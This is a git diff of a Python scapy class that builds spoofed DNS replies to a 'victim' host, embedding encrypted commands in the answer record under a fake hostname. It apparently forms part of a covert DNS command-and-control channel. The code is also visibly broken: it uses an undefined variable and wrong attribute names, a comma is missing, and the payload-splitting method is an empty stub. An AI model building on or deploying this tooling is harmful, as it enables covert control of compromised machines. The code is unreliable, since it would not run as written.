@@ -4,11 +4,21 @@ from scapy.all import *
 
 class Bundler():
 
-    def __init__(self, data, victim_mac, victim_ip, victim_packet):
+    def __init__(self, victim_packet, fake_hostname):
         self.data = data
-        self.victim_mac = victim_mac
-        self.victim_ip = victim_ip
         self.victim_packet = victim_packet
+        self.fake_hostname = fake_hostname
+        self.victim_id = victim_packet.getlayer(Ether).src
+
+    def build_command_pkt(self, encrypted_comand):
+        return self._build_ether() \
+                / self._build_ip() \
+                / self._build_udp() \
+                / self._build_dns(encrypted_comand)
+    
+    # TODO: Must break up large payload 
+    def build_payload_pkts(self):
+        pass
 
     def _build_packet(self):
         return self._build_ether() \
@@ -18,27 +28,29 @@ class Bundler():
 
     def _build_ether(self):
         # Not sure if we need src
-        return Ether(dst=self.victim_mac)
+        ether_layer = self.victim_packet.getlayer(Ether)
+        return Ether(dst=ether_layer.src, src=ether_layer.dst)
 
     def _build_ip(self):
-        return IP(dst=self.victim_ip, ttl=128, flags='')
+        ip_layer = self.victim_packet.getlayer(IP)
+        return IP(dst=self.ip_layer.src, src=ip_layer.dest, ttl=128, flags='', version=4)
     
     def _build_udp(self):
-        victim_udp = self.victim_packet.getlayer(UDP)
-        return UDP(sport=victim_udp.dport, dport=victim_udp.sport)
+        udp_layer = self.victim_packet.getlayer(UDP)
+        return UDP(sport=udp_layer.dport, dport=udp_layer.sport)
 
-    def _build_dns(self):
-        victim_dns = self.victim_packet.getlayer(DNS)
-        victim_qr = self.victim_packet.getlayer(DNSQR)
+    def _build_dns(self, payload):
+        dns_layer = self.victim_packet.getlayer(DNS)
+        dnsqr_layer = self.victim_packet.getlayer(DNSQR)
         return DNS(
             qr=1, rd=1, ra=1, ancount=1, nscount=0, arcount=0,
             ns=None, ar=None
             an = DNSRR(
-                rrname='test', # Update with payload
-                type='A',
+                rrname=self.fake_hostname, # Update with spoof address
+                type=dnsqr_layer.qtype, # Determines PING, DATA, RECPT
                 rclass='IN', # Update?
                 ttl=700,
                 rdlen=4,
-                rdata='payload' # Update with payload
+                rdata=payload # Update with payload
             )
         )
